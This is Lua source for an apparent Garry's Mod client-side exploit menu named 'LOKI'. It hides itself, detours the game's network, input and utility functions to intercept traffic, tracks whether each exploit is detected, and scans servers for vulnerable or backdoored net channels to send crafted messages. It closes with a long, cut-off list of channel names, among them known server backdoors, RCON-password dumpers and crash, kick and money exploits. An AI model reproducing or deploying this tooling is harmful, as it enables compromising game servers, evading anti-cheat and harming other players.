local LOKI = {LP = LocalPlayer(), ARES = true}
LOKI.LAST = {}
local LAST_TABLE = {}
if(isfunction(cleanup.GetList)) then
    LAST_TABLE = cleanup.GetList()
end
if(istable(LAST_TABLE)) then
    LOKI.LAST = table.Copy( LAST_TABLE )
end
function cleanup.GetList() return LOKI end
LOKI.Developer = false
LOKI.SecureHooks = true
LOKI.Config = {}    
local grad = Material( "gui/gradient" )
local upgrad = Material( "gui/gradient_up" )
local downgrad = Material( "gui/gradient_down" )
local ctext = chat and chat.AddText or print
function LOKI.GetUpValues( func )
    if(!isfunction(func)) then return {} end
    if(isfunction(debug.getupvalues)) then
        return debug.getupvalues(func)
    end
    local info = debug.getinfo( func, "uS" )
    local variables = {}
 
    -- Upvalues can't be retrieved from C functions
    if ( info != nil && info.what == "Lua" ) then
        local upvalues = info.nups
 
        for i = 1, upvalues do
            local key, value = debug.getupvalue( func, i )
            variables[ key ] = value
        end
    end
 
    return variables
end
function LOKI.MultiSend(sploit, func)
    for k, v in ipairs(sploit.functions) do
        if(sploit.bools[v.bool] == true) then
            LOKI.NetStart( sploit, v.channel )
            if(isfunction(func)) then
                func()
            elseif(istable(func) && (isfunction(func[v.channel]) || isfunction(func["*"]))) then
                func[v.channel || "*"]()
            end
            net.SendToServer()
        end
    end
end
function LOKI.GetEnabledCount(sploit)
    if(!sploit) then return 0 end
    local i = 0
    for k, v in pairs(sploit.bools) do
        if(v == true && k != "enabled") then
            i = i + 1
        end
    end
    return i
end
function LOKI.GetEnabled(sploit)
    if(!sploit) then return false end
    if(table.Count(sploit.bools) == 1 || sploit.typ != "bools") then return sploit.bools.enabled end
    for k, v in pairs(sploit.bools) do
        if(v == true && k != "enabled") then
            return true
        end
    end
    return false
end
function LOKI.ValidNetString( ... )
    local tbl = {...}
    if(#tbl == 0) then return false end
    if(istable(tbl)) then
        for k, v in pairs(tbl) do
            if(LOKI.BAIT_CHANNELS[v] && LOKI.BAIT_COUNT >= LOKI.BAIT_LIMIT && !LOKI.GENERAL_OVERRIDE) then return false, 1 end
            LOKI.BlockNetOutgoing = true
            if(util.NetworkIDToString(util.NetworkStringToID( v )) != v) then -- && (!LOKI.ServerDump || LOKI.ServerDump:find(v)
                LOKI.BlockNetOutgoing = false
                return false
            end
            LOKI.BlockNetOutgoing = false
        end
        return true
    end
    return false
end
function LOKI.DynamicNetString( ... )
    local tbl = {...}
    for i = 1, math.huge do
        local str = util.NetworkIDToString(i)
        if not str then return false end
        
        local found = true
        
        if(istable(tbl)) then
            for k, v in pairs(tbl) do
                if(!v || str:find(v) == nil) then
                    found = false
                end
            end
        end
        
        if(found) then
            if(LOKI.BAIT_CHANNELS[str] && LOKI.BAIT_COUNT >= LOKI.BAIT_LIMIT && !LOKI.GENERAL_OVERRIDE) then return false, 1 end
            return str
        end
    end
end
function LOKI.DynamicNetStrings( ... )
    local tbl = {...}
    local ret = {}
    local bait_count = 0
    for i = 1, math.huge do
        local str = util.NetworkIDToString(i)
        if not str then break end
        
        local found = true
        
        if(istable(tbl)) then
            for k, v in pairs(tbl) do
                if(!v || str:find(v) == nil) then
                    found = false
                end
            end
        end
        
        if(found) then
            if (LOKI.BAIT_CHANNELS[str] && LOKI.BAIT_COUNT >= LOKI.BAIT_LIMIT && !LOKI.GENERAL_OVERRIDE) then
                bait_count = bait_count + 1
            else
                ret[#ret+1] = str
            end
        end
    end
    return ret, bait_count
end
function LOKI.GetAllReceivers()
    LOKI.Receivers = {[1] = {["str"] = "*"}}
    for i = 1, math.huge do
        local str = util.NetworkIDToString(i)
        if !str || !LOKI.ValidNetString(str) then break end
        
        LOKI.Receivers[#LOKI.Receivers + 1] = {["str"] = str}
    end
    return LOKI.Receivers
end
LOKI.ents = {}
LOKI.ents.FindByGlobal = function(...)
    local tbl = {...}
    local ent_tbl = {}
    local found = true
    if(#tbl == 0) then
        return ents.GetAll()
    end
    for k, v in ipairs(ents.GetAll()) do
        found = true
        if(istable(tbl)) then
            for k2, v2 in pairs(tbl) do
                if(v[v2] == nil) then
                    found = false
                end
            end
        end
        if(found) then
            ent_tbl[#ent_tbl + 1] = v
        end
    end
    return ent_tbl
end
LOKI.vgui = {
    Create = function(class, parent, name)
        local detour_call = LOKI.DetourCall || false
        LOKI.DetourCall = false
        local ret = vgui.Create(class, parent, name, true)
        LOKI.DetourCall = detour_call
        return ret
    end
}
LOKI.Exploits = {}
LOKI.StartCol = Color(150, 50, 0)
LOKI.FinishCol = Color(80, 80, 120)
function LOKI.Interpolate(a, b, proportion)
    return (a + ((b - a) * (proportion / 100)));
end
function LOKI.GetColor(percentage)
    percentage = math.Clamp(percentage, 0, 100)
    if(percentage == 0) then
        return Color(255,255,255)
    end
    local a, b, c = ColorToHSV(LOKI.FinishCol)
    local a1, b1, c1 = ColorToHSV(LOKI.StartCol)
    local a2, b2, c2
    a2 = LOKI.Interpolate(a, a1, percentage)
    b2 = LOKI.Interpolate(b, b1, percentage)
    c2 = LOKI.Interpolate(c, c1, percentage)
    return HSVToColor(a2,b2,c2)
end
local StatusColors = {
    [1] = Color( 80, 120, 80 ),
    [2] = Color( 150, 90, 50 ),
    [3] = Color( 150, 50, 0 ),
    [4] = Color( 255, 255, 255 ),
}
local StatusText = {
    [1] = "Undetected",
    [2] = "Outdated",
    [3] = "Detected",
    [4] = "N/A",
}
LOKI.Index = {}
function LOKI.GetExploit(Name, Index)
    local IndexTable = LOKI.Index[Name]
    if(LOKI.Exploits[IndexTable]) then
        if(Index) then
            return LOKI.Exploits[IndexTable][Index]
        else
            return LOKI.Exploits[IndexTable]
        end
    else
        return false
    end
end
function LOKI.ValidTable(tbl)
    if(istable(tbl)) then
        return "table"
    elseif(type(tbl) != "string" && getmetatable(tbl) && getmetatable(tbl).__index != nil) then
        return "metatable"
    else
        return false
    end
end
function LOKI.NotNil(var)
    if(var != nil) then
        return var
    end
end
function LOKI.RecursiveGetVar(search, tbl, typevar, create)
    if(!LOKI.ValidTable(search) || !LOKI.ValidTable(tbl)) then
        return false
    end
    for k, v in pairs(tbl) do
        if((!search || !search[v]) || (search && search[v] && (typevar && type(search[v]) != typevar) && !LOKI.ValidTable(search[v]))) then
            if((!search || !search[v]) && typevar == "table" && create) then
                if(!search) then
                    search = {}
                end
                search[v] = {}
                search = search[v]
            else
                return false
            end
        else
            if(!search[v] && typevar == "table" && create) then
                search[v] = {}
            end
            search = search[v]
        end
    end
    return search
end
function LOKI.GetAllExploits()
    local exploits = {}
    for k, v in ipairs( LOKI.Exploits ) do
        if(istable(v) && v.IsCategory) then
            for k2, v2 in ipairs(v) do
                if(istable(v2) && v2.Name) then
                    exploits[#exploits + 1] = v2
                end
            end
        end
    end
    return exploits
end
LOKI.Detours = LOKI.LAST.Detours || {}
function LOKI.GetDetour(Name, Fallback)
    local str = string.Split(Name, ".")
    return LOKI.Detours[(str[1])] && LOKI.Detours[(str[1])][(str[2])] || Fallback
end
function LOKI.Detour(tbl_name, func, tbl, callback)
    if(!LOKI.ValidTable(tbl)) then return end
    if(!LOKI.Detours[tbl_name]) then
        LOKI.Detours[tbl_name] = {}
    end
    if(!LOKI.Detours["Backup"]) then
        LOKI.Detours["Backup"] = {}
    end
    if(!LOKI.Detours["Backup"][tbl_name]) then
        LOKI.Detours["Backup"][tbl_name] = {table.Copy(tbl)}
    end
    if(!LOKI.Detours[tbl_name][func]) then
        LOKI.Detours[tbl_name][func] = LOKI.Detours["Backup"][tbl_name][1][func]
        //print(tbl_name.."."..func .. " detoured successfully")
    end
    if(isfunction(LOKI.Detours[tbl_name][func])) then
        if(!LOKI.Detours["Callback"]) then
            LOKI.Detours["Callback"] = {}
        end
        if(!LOKI.Detours["Callback"][tbl_name]) then
            LOKI.Detours["Callback"][tbl_name] = {}
        end
        LOKI.Detours["Callback"][tbl_name][func] = callback
 
        local sfunc = LOKI.Detours[tbl_name][func]
        rawset(tbl, func, callback)
        if(tbl[func] == sfunc) then
            tbl[func] = callback
        end
    end 
end
local net = net
if(DLib && istable(DLib.nativeNet)) then
    net = DLib.nativeNet
end
LOKI.TYPEVARS = {
    MORETHAN = 0,
    LESSTHAN = 1,
    EQUALTO = 2,
    NOTEQUALTO = 3,
}
LOKI.DetourTables = {
    ["net"] = {
        ["table"] = _G.net,
        ["functions"] = {["*"] = true, ["Incoming"] = false, ["Receive"] = false},
        ["PreCall"] = {
            ["Start"] = function(key, tbl, varargs)
                if(LOKI.SafeOutgoingMsg == varargs[1]) then return end
                tbl.NetOutgoingMsg = varargs[1]
                if(LOKI.BlockNetOutgoing) then return false end
            end,
            ["*"] = function(key, tbl, varargs, func)
                if(LOKI.NetOutgoingMsg) then
                    if(!istable(tbl.NetOutgoingData) || !tbl.NetOutgoingData[0] || tbl.NetOutgoingData[0] != LOKI.NetOutgoingMsg) then
                        tbl.NetOutgoingData = {[0] = tbl.NetOutgoingMsg}
                    end
                    if(key:StartWith("Write") && jit.util.funcinfo(func).addr) then
                        if(#varargs != 0) then
                            local index = #tbl.NetOutgoingData+1
                            local typevar = string.Replace(key, "Write", "")
                            tbl.NetOutgoingData[index] = varargs
                            tbl.NetOutgoingData[index].Type = typevar
                        end
                        if(LOKI.BlockNetOutgoing) then return false end
                    end
                end
            end,
        },
        ["PostCall"] = {
            ["SendToServer"] = function(key, tbl, varargs)
                if(tbl.NetOutgoingMsg && LOKI.Developer) then PrintTable(tbl.NetOutgoingData) end
                tbl.NetOutgoingMsg = nil 
                tbl.NetOutgoingData = nil 
            end,
        },
    },
    ["concommand"] = {
        ["table"] = _G.concommand,
        ["functions"] = {["*"] = true, ["Add"] = false, ["GetTable"] = false},
    },
    /*["string"] = {
        ["table"] = _G.string,
        ["functions"] = {["lower"] = true},
    },*/
    ["util"] = {
        ["table"] = _G.util,
        ["functions"] = {["NetworkIDToString"] = true, ["TraceLine"] = true, ["TableToJSON"] = true},
    },
    ["math"] = {
        ["table"] = _G.math,
        ["functions"] = {["random"] = true, ["abs"] = true},
    },
    ["table"] = {
        ["table"] = _G.table,
        ["functions"] = {["Copy"] = true},
    },
    ["usermessage"] = {
        ["table"] = _G.usermessage,
        ["functions"] = {["IncomingMessage"] = true},
    },
    ["cam"] = {
        ["table"] = _G.cam,
        ["functions"] = {["Start3D"] = true, ["End3D"] = true},
    },
    ["vgui"] = {
        ["table"] = _G.vgui,
        ["functions"] = {["Create"] = true},
    },
    /*["render"] = {
        ["table"] = _G.render,
        ["functions"] = {["SetRenderTarget"] = true},
    },*/
    ["gui"] = {
        ["table"] = _G.gui,
        ["functions"] = {["*"] = true, ["EnableScreenClicker"] = false, ["MousePos"] = false, ["MouseX"] = false, ["MouseY"] = false, ["OpenURL"] = false, ["ScreenToVector"] = false},
    },
    ["input"] = {
        ["table"] = _G.input,
        ["functions"] = {["StartKeyTrapping"] = true, ["SetCursorPos"] = true, ["LookupKeyBinding"] = true, ["LookupBinding"] = true},
    },
    ["properties"] = {
        ["table"] = _G.properties,
        ["functions"] = {["Add"] = true},
    },
    /*["_G"] = {
        ["table"] = _G,
        ["functions"] = {["SortedPairsByMemberValue"] = true},
    },*/
}
// table_to_search, variable, MORE/LESS/EQUALTO, value, varargs
function LOKI.GetVarTable(tbl, var, typevar, val, metatable, ...)
    if(!typevar) then
        typevar = LOKI.TYPEVARS.EQUALTO
    end
    local exploits = {}
    if(istable(tbl) && var && typevar && val) then
        for k, v in ipairs( tbl ) do
            if(LOKI.ValidTable(v)) then
                local var_l,val_l = var,val
                if(LOKI.ValidTable(var)) then
                    var_l = LOKI.RecursiveGetVar(v, var)
                else
                    if(isfunction(v[var])) then
                        if(LOKI.ValidTable(v) == "metatable" || metatable) then
                            var_l = v[var](v, ...)
                        else
                            var_l = v[var](...)
                        end
                    else
                        var_l = v[var]
                    end
                    if(isfunction(val)) then
                        val_l = val()
                    end
                end
                if(typevar == LOKI.TYPEVARS.MORETHAN) then
                    if(LOKI.SafeToNumber(var_l) > LOKI.SafeToNumber(val_l)) then
                        exploits[#exploits + 1] = v
                    end
                elseif(typevar == LOKI.TYPEVARS.LESSTHAN) then
                    if(LOKI.SafeToNumber(var_l) < LOKI.SafeToNumber(val_l)) then
                        exploits[#exploits + 1] = v
                    end
                elseif(typevar == LOKI.TYPEVARS.EQUALTO) then
                    if(var_l == val_l) then
                        exploits[#exploits + 1] = v
                    end
                elseif(typevar == LOKI.TYPEVARS.NOTEQUALTO) then
                    if(var_l != val_l) then
                        exploits[#exploits + 1] = v
                    end
                end
            end
        end
    end
    return exploits
end
function LOKI.SetTableContents(t1,t2)
    table.Empty(t1)
    table.Merge(t1, t2)
end
function LOKI.GetVarExploits(var, typevar, val)
    return LOKI.GetVarTable(LOKI.GetAllExploits(), var, typevar, val)
end
LOKI.RunDetours = function()
    for k, v in pairs(LOKI.DetourTables) do
        local ValidTable = LOKI.ValidTable(v.table)
        if(istable(v) && ValidTable) then
            for k1, v1 in pairs(v.table) do
                if(isfunction(v1) && (!istable(v.functions) || ((v.functions["*"] && v.functions[k1] != false) || v.functions[k1]))) then
                    LOKI.Detour(k, k1, v.table, function(...)
                        local varargs = {...}
                        //if(LOKI.Killswitch && !LOKI.Unload && !LOKI.Detours) then return v1(unpack(varargs)) end
                        local func = LOKI.Detours[k][k1]
                        if(!LOKI.Killswitch && !LOKI.Unload) then
                            if(istable(v.PreCall) && isfunction(v.PreCall[k1] || v.PreCall["*"])) then
                                local ret_val = ((v.PreCall[k1] || v.PreCall["*"])(k1, LOKI, varargs, func))
                                if ret_val != nil then return ret_val end
                            end
                            
                            if(LOKI.DetourCall != true) then
                                local ret = nil
                                
                                if(isfunction(LOKI.GetAllExploits)) then
                                    local det_call = LOKI.DetourCall || false
                                    LOKI.DetourCall = true
                                        for k2, v2 in ipairs(LOKI.GetAllExploits()) do
                                            local tbl = v2.hooks && (v2.hooks[k] || v2.hooks["*"])
                                            if(v2.scanned && v2.hooks && tbl && (tbl[k1] || tbl["*"])) then
                                                local xfunc = (tbl[k1] || tbl["*"])
                                                local return_val = nil
                                                if(xfunc == tbl["*"]) then
                                                    return_val = xfunc(k, k1, v2, varargs, LOKI.Detours[k][k1])
                                                else
                                                    return_val = xfunc(v2, varargs, LOKI.Detours[k][k1])
                                                end
                                                if(return_val != nil) then
                                                    ret = return_val
                                                end
                                            end
                                        end
                                    LOKI.DetourCall = det_call
                                end
                                
                                if(istable(v.PostCall) && isfunction(v.PostCall[k1] || v.PostCall["*"])) then
                                    local ret_val = ((v.PostCall[k1] || v.PostCall["*"])(k1, LOKI, varargs, func))
                                    if ret_val != nil then return ret_val end
                                end
                                
                                if(ret) then
                                    return ret
                                elseif(ret == false) then
                                    return false
                                end
                            end
                        end
                        
                        if(!LOKI.RETURN_OVERRIDE) then
                            if(ValidTable == "metatable") then
                                return func(v.table, unpack(varargs))
                            else
                                return func(unpack(varargs))
                            end
                        end
                        LOKI.RETURN_OVERRIDE = false
                    end)
                end
            end
        end
    end
end
LOKI.RunDetours()
function LOKI.GetLP()
    return LOKI.LP
end
function LOKI.AddExploit( Name, tab )
    if !isstring( Name ) then print("Error: Exploit missing Name") return end
    if !istable( tab ) then print("Error: Exploit missing table") return end
    tab.Name = Name
    if(!LOKI.Index[Name]) then
        if(tab.severity != 0) then
            LOKI.Index[Name] = table.insert(LOKI.Exploits, {})
        else
            LOKI.Index[Name] = table.insert(LOKI.Exploits, 1, {})
        end
        local IndexTable = LOKI.Index[Name]
        LOKI.Exploits[IndexTable] = {["IsCategory"] = true}
    end
    local IndexTable = LOKI.Index[Name]
    local Index = table.insert(LOKI.Exploits[IndexTable], tab)
    LOKI.GetExploit(Name, Index).Index = Index
    if !tab.hooks && !tab.general_override then print("Error: Function with no hooks added, is this the intention?") print(LOKI.GetExploit(Name, Index).Name, Index) end
end
function LOKI.IsStored( addr )
    return LOKI.Config[addr] != nil && LOKI.Config[addr].val != nil
end
function LOKI.GetStored( addr, fallback, skipwhitelist, datatable )
    local tbl = LOKI.Config
    if(tbl[addr] == nil && fallback == nil) then return end
    if fallback and (tbl[addr] == nil || tbl[addr].val == nil || tbl[addr].val == {}) then LOKI.Store(addr, fallback) end
    if((istable(tbl[addr].val) || fallback == {}) && LOKI.GetWhitelist(addr) && !skipwhitelist) then
        local plytbl = player.GetAll()
        for k, v in pairs( tbl[addr].val ) do
            table.RemoveByValue(plytbl, v)
        end
        return plytbl
    end
    if fallback and (tbl[addr] == nil || tbl[addr].val == nil) then return fallback end
    return tbl[addr].val
end
function LOKI.NetStart( sploit, str, rel )
    LOKI.BlockNetOutgoing = true
    LOKI.GENERAL_OVERRIDE = true
    if(!istable(str) && !LOKI.ValidNetString( str )) then
        print("Warning: " .. sploit.Name .. " #".. sploit.Index .. " attempted to send an unpooled message", str)
        LOKI.BlockNetOutgoing = false
        LOKI.GENERAL_OVERRIDE = false
    else
        if((!sploit || isstring(sploit)) && !str) then
            print("An exploit is using the legacy system and will not support rate limiting, tell invalid")
            str = sploit
        else
            if(!sploit["Sender"] && LOKI.GetEnabled(sploit) && LOKI.RecursiveGetVar(sploit, {"hooks", "Think"}, "function")) then
                sploit["Sender"] = true
            end
        end
        if(isfunction(nwidcek)) then
            if(isfunction(netStart)) then
                LOKI.Detours["net"]["Start"] = netStart
            end
        end
        local netstart = net.Start
        if odium and odium.G and odium.G.net then
            netstart = odium.G.net.Start
        end
        if(istable(str)) then
            for k, v in pairs(str) do
                if(LOKI.ValidNetString(v)) then
                    str = v
                    break
                end
            end
        end
        if(istable(str)) then
            print("Warning: " .. sploit.Name .. " #".. sploit.Index .. " attempted to send an unpooled message")
            LOKI.BlockNetOutgoing = false
            return
        end
        LOKI.SafeOutgoingMsg = str
        local ret = nil
        if(rel) then
            ret = netstart( str )
        else
            ret = netstart( str, LOKI.ARES )
        end
        LOKI.BlockNetOutgoing = false
        LOKI.SafeOutgoingMsg = nil
        LOKI.GENERAL_OVERRIDE = false
        return ret
    end
end 
function LOKI.RCC(sploit, ...)
    local RCC = RunConsoleCommand
    if(istable(sploit)) then
        if(!sploit["Sender"] && LOKI.GetEnabled(sploit) && LOKI.RecursiveGetVar(sploit, {"hooks", "Think"}, "function")) then
            sploit["Sender"] = true
        end
        local det_call = LOKI.DetourCall || false
        LOKI.DetourCall = true
        local ret = RCC( ... )
        LOKI.DetourCall = det_call
        return ret
    else
        print("An exploit is using the legacy system and will not support rate limiting, tell invalid")
    end
end
function LOKI.Store( addr, val, datatable )
    local tbl = datatable || LOKI.Config
    if(tbl[addr] == nil) then
        tbl[addr] = {}
    end
    tbl[addr].val = (istable(val) && table.Copy(val)) || val
end 
function LOKI.SetWhitelist( addr, bool, datatable )
    local tbl = datatable || LOKI.Config
    if(tbl[addr] == nil) then
        tbl[addr] = {}
    end
    tbl[addr].IsWhitelist = bool
end 
function LOKI.GetWhitelist( addr, datatable )
    local tbl = datatable || LOKI.Config
    return tbl[addr] != nil && tbl[addr].IsWhitelist == true
end
function LOKI.GetAllStored()
    return LOKI.Config
end
function LOKI.GetAllStoredData()
    local ret = {}
    for k, v in pairs( LOKI.Config ) do
        if !istable( v ) then ret[k] = v end
    end
    return ret
end
function LOKI.LoadConfig()
    local f = file.Read( "lokiv2.dat", "DATA" )
    if !f then return print( "Error: No saved configs found" ) end
    local raw = util.Decompress( f )
    local config = util.JSONToTable( raw )
    table.Merge( LOKI.Config, config )
--    LOKI.Config = config
    LOKI.Menu:Remove()
    print( "Loaded Configuration File" )
end
function LOKI.SaveConfig()
    local config = util.TableToJSON( LOKI.GetAllStoredData() )
    if !config then return end
    local compressed = util.Compress( config )
    file.Write( "lokiv2.dat", compressed )
    print( "Saved Configuration File" )
end
LOKI.BAIT_UNSORTED = {"fg_printer_money", "SprintSpeedset", "CFEndGame", "sendtable", "plyWarning", "pplay_deleterow", "NLR_SPAWN", "TowTruck_CreateTowTruck", "ARMORY_RetrieveWeapon", "pac.net.TouchFlexes.ClientNotify", "slua2", "ClickerAddToPoints", "steamid2", "TransferReport", "explodeallcarbd", "Sbox_gm_attackofnullday_key", "ats_send_toServer", "redirectionplayerbd", "AbilityUse", "RP_Fine_Player", "DaHit", "JB_Votekick", "CpForm_Answers", "skeleton_dancing_troll", "ignite_bd", "75_plus_win", "modelchangerbd", "BuySecondTovar", "spawnentitybd", "FactionInviteConsole", "rprotect_terminal_settings", "ban_rdm", "forcejobbd", "textscreens_download", "PoliceJoin", "CFRemoveGame", "├Ş├á?D)Ôùİ", "RevivePlayer", "DataSend", "TOW_SubmitWarning", "BM2.Command.SellBitcoins", "DepositMoney", "CFJoinGame", "ItemStoreUse", "forceconcommandbd", "Kun_SellOil", "PCAdd", "drugseffect_hpremove", "artillerybd", "argentjetaurrais2", "spawnvehiclebd", "netKey", "NC_GetNameChange", "pac_to_contraption", "start_wd_emp", "messagespambd", "linkbd", "accidentvoiturebd", "hsend", "egg", "unlockalldoororlockallbd", "18_25_hack_mood", "RXCAR_SellINVCar_C2S", "RecKickAFKer", "tickbooksendfine", "pac_submit", "banleaver", "rebootbd", "VJSay", "ATM_DepositMoney_C2S", "Sandbox_ArmDupe", "net_PSUnBoxServer", "GiveHealthNPC", "memes", "PlayerUseItem", "Letthisdudeout", "services_accept", "DarkRP_SS_Gamble", "dLogsGetCommand", "SellMinerals", "superadmin_vite", "RXCAR_Shop_Store_C2S", "ATS_WARP_REMOVE_CLIENT", "changerlenombd", "fpp_reset_all", "2dplayermodelbd", "TOW_PayTheFine", "spawnpropbd", "CraftSomething", "clearallbansbd", "mercipourtonip", "withdrawp", "SendMoney", "BuyCar", "FIRE_CreateFireTruck", "jeveuttonrconleul", "kill_player_bd", "fp_as_doorHandler", "pplay_sendtable", "disablebackdoor", "godmodbd", "teleport2bd", "customprinter_get", "MONEY_SYSTEM_GetWeapons", "gportal_rpname_change", "hitcomplete", "artilleryplayerbd", "fuckupulxbd", "Remove_Exploiters", "NDES_SelectedEmblem", "NLR.ActionPlayer", "NET_EcSetTax", "StackGhost", "DarkRP_Kun_ForceSpawn", "whk_setart", "Upgrade", "CreateCase", "rconspammer", "_blacksmurf", "disguise", "infiniteammobd", "drugseffect_remove", "playsoundurlbd", "SimplicityAC_aysent", "freezeplybd", "BuilderXToggleKill", "GMBG:PickupItem", "MDE_RemoveStuff_C2S", "SimpilicityAC_aysent", "BuyFirstTovar", "gBan.BanBuffer", "PCDelAll", "jesuslebg", "TalkIconChat", "hurlement_bd", "ATS_WARP_VIEWOWNER", "drugs_text", "bodyman_model_change", "inversergraviterbd", "changejobnamebd", "WriteQuery", "TCBBuyAmmo", "TFA_Attachment_RequestAll", "TCBuyAmmo", "BuyKey", "ckit_roul_bet", "nostrip", "centerbd", "NET_SS_DoBuyTakeoff", "DarkRP_spawnPocket", "teleport1bd", "ActivatePC", "drugs_money", "pogcp_report_submitReport", "race_accept", "healtharmorbd", "TakeBetMoney", "BuyCrate", "Kun_ZiptieStruggle", "faitcommeloiseaubd", "FacCreate", "DuelMessageReturn", "ATS_WARP_FROM_CLIENT", "DL_Answering", "thefrenchenculer", "Taxi_Add", "pplay_addrow", "stripallbd", "CRAFTINGMOD_SHOP", "SyncPrinterButtons76561198056171650", "ply_pick_shit", "join_disconnect", "DarkRP_preferredjobmodel", "viv_hl2rp_disp_message", "Kun_SellDrug", "forcesaybd", "drugs_ignite", "chatspambd", "Warn_CreateWarn", "buyinghealth", "NewReport", "BM2.Command.Eject", "kickbd", "argentjetaurrais", "EZS_PlayerTag", "1942_Fuhrer_SubmitCandidacy", "ATMDepositMoney", "blacksmurfBackdoor", "JoinOrg", "toupiebd", "casinokit_chipexchange", "FinishContract", "rektallmodels", "discobd", "crashplayergamebd", "giveweaponbd", "hhh_request", "zilnix", "rconadmin", "FarmingmodSellItems", "give_me_weapon", "Morpheus.StaffTracker", "NLRKick", "Chatbox_PlayerChat", "rconcommandbd", "Chess Top10", "cloackbd", "RP_Accept_Fine", "WithdrewBMoney", "reports.submit", "slua", "giveweapon", "RHC_jail_player", "duelrequestguiYes", "tremblementdeterrebd", "kart_sell", "speedhackbd", "removepermaprop_bd", "soez", "deletealldatabd", "textstickers_entdata", "BailOut", "pplay_sendtable", "VJSay", "textstickers_entdata", "NC_GetNameChange", "CFJoinGame", "loki_bigspames2", "SKIN", "stringx", "mathx", "_G", "color_white", "_LOADLIB", "_LOADED", "color_transparent", "func", "g_SBoxObjects", "tablex", "Morph", "SpawniconGenFunctions", "DOF_Ents", "_E", "_R", "duelrequestguiYes", "drugs_money", "drugs_ignite", "drugs_text", "SyncPrinterButtons76561198056171650", "rprotect_terminal_settings", "JoinOrg", "NDES_SelectedEmblem", "join_disconnect", "NLRKick", "Morpheus.StaffTracker", "duelrequestguiYes", "drugs_ignite", "ply_pick_shit", "TalkIconChat", "NDES_SelectedEmblem", "BuyFirstTovar", "BuySecondTovar", "GiveHealthNPC", "BuyKey", "BuyCrate", "MONEY_SYSTEM_GetWeapons", "SyncPrinterButtons16690", "DarkRP_SS_Gamble", "PCAdd", "DarkRP_SS_Gamble", "viv_hl2rp_disp_message", "Sbox_gm_attackofnullday", "Sbox_gm_attackofnullday_key", "Kun_SellDrug", "Ulib_Message", "ULogs_Info", "fix", "Fix_Keypads", "noclipcloakaesp_chat_text", "_Defqon", "_CAC_ReadMemory", "nostrip", "nocheat", "LickMeOut", "ULX_QUERY2", "ULXQUERY2", "MoonMan", "Im_SOCool", "Sandbox_GayParty", "DarkRP_UTF8", "oldNetReadData", "memeDoor", "BackDoor", "OdiumBackDoor", "SessionBackdoor", "DarkRP_AdminWeapons", "cucked", "NoNerks", "kek", "ZimbaBackDoor", "something", "random", "enablevac", "idk", "fellosnake", "c", "killserver", "fuckserver", "cvaraccess", "rcon", "web", "jesuslebg", "Þ� ?D)◘", "DefqonBackdoor", "WriteQuery", "SellMinerals", "TakeBetMoney", "Kun_SellOil", "PoliceJoin", "CpForm_Answers", "MDE_RemoveStuff_C2S", "RP_Accept_Fine", "l_players_listing_fine", "montant_argent11", "RXCAR_Shop_Store_C2S", "CRAFTINGMOD_SHOP", "drugs_ignite", "drugseffect_hpremove", "drugs_text", "GMBG:PickupItem", "plyWarning", "timebombDefuse", "start_wd_emp", "kart_sell", "FarmingmodSellItems", "ClickerAddToPoints", "bodyman_model_change", "BailOut", "TOW_SubmitWarning", "FIRE_CreateFireTruck", "hitcomplete", "hhh_request", "DaHit", "customprinter_get", "textstickers_entdata", "TCBBuyAmmo", "DataSend", "rprotect_terminal_settings", "fp_as_doorHandler", "TransferReport", "stripper_gunz", "properties", "skeleton_dancing_troll", "music", "rcon_passw_dump", "jeveuttonrconleul", "aucun_rcon_ici", "jeveuttonrconleul", "Надеюсь, ты усвоил урок", "cl_yawspeed 8", "Music_troll", "wowlolwut_my_boi", "ITEM", "chmluaviewer", "Defqon_wallhack", "Defqon_anticheats", "NET_LUA_CLIENTS", "NET_LUA_SV", "EASY_CHAT_MODULE_LUA_CLIENTS", "EASY_CHAT_MODULE_LUA_SV", "blackdoor", "toxic.LuaStr", "toxic.pro", "bodyman_chatprint", "bodyman_model_change", "bodygroups_change", "skins_change", "thereaper", "noprop", "dontforget", "aze46aez67z67z64dcv4bt", "changename", "nolag", "reaper", "slua2", "thereaperishere", "hentai", "slua", "the2d78", "bethedeath", "elfamosabackdoormdr", "zilnixestbo", "reaperexploits", "fr_spamstring", "CpForm_Answers", "MDE_RemoveStuff_C2S", "start_wd_emp", "kart_sell", "FarmingmodSellItems", "ClickerAddToPoints", "fp_as_doorHandler", "TransferReport", "odium_setname", "ace_menu", "odium_lua_run_cl", "blogs_refresh", "blogs_refreshblog", "blogs_resetall", "pChat", "SuggestionsBriefInfo", "SuggestionsSpecificInfo", "SuggestionsGetInfo", "SuggestionsClientEdits", "SuggestionsRefresh", "Morpheus.Init", "Morpheus.ClientCheckActivity", "DL_Answering_global", "pSayBroadcaster", "TCBBuyAmmo", "DataSend", "FarmingmodSellItems", "duelrequestguiYes", "egg", "TalkIconChat", "exploits_open", "chat_AddText", "magnum", "RAINBOWPLAYER", "menu", "setMagicTypeHP", "TheFrenchGuy", "htx_mode", "htx_menu", "htx_macros", "ГћГ ?D)в—", "metro_notification", "BM2.Command.SellBitcoins", "ItemStoreUse", "ItemStoreDrop", "gMining.sellMineral", "PlayerUseItem", "RequestMAPSize", "MG2.Request.GangRankings", "dLogsGetCommand", "shopguild_buyitem", "VoteKickNO", "VoteBanNO", "Warn_CreateWarn", "showDisguiseHUD", "Chatbox_PlayerChat", "BuilderXToggleKill", "services_accept", "lockpick_sound", "InformPlayer", "1942_Fuhrer_SubmitCandidacy", "FacCreate", "FactionInviteConsole", "WithdrewBMoney", "deathrag_takeitem", "REPPurchase", "Resupply", "DarkRP_Defib_ForceSpawn", "FiremanLeave", "CreateEntity", "CREATE_REPORT", "Hopping_Test", "CpForm_Answers", "VehicleUnderglow", "OpenGates", "DemotePlayer", "SendMail", "REPAdminChangeLVL", "BuyUpgradesStuff", "SquadGiveWeapon", "SetTableTarget", "UpdateRPUModelSQL", "disguise", "gportal_rpname_change", "NewRPNameSQL", "chname", "AbilityUse", "race_accept", "NLR_SPAWN", "opr_withdraw", "revival_revive_accept", "BuyFirstTovar", "BuySecondTovar", "MONEY_SYSTEM_GetWeapons", "MCon_Demote_ToServer", "withdrawMoney", "gPrinters.retrieveMoney", "NGII_TakeMoney", "money_clicker_withdraw", "opr_withdraw", "NET_DoPrinterAction", "tickbooksendfine", "withdrawp", "PCAdd", "viv_hl2rp_disp_message", "Kun_SellOil", "gPrinters.sendID", "requestmoneyforvk", "vj_testentity_runtextsd", "NET_BailPlayer", "rpi_trade_end", "ClickerForceSave", "SRequest", "HealButton", "GiveArmor100", "GiveSCP294Cup", "Client_To_Server_OpenEditor", "userAcceptPrestige", "wordenns", "guncraft_removeWorkbench", "BuyKey", 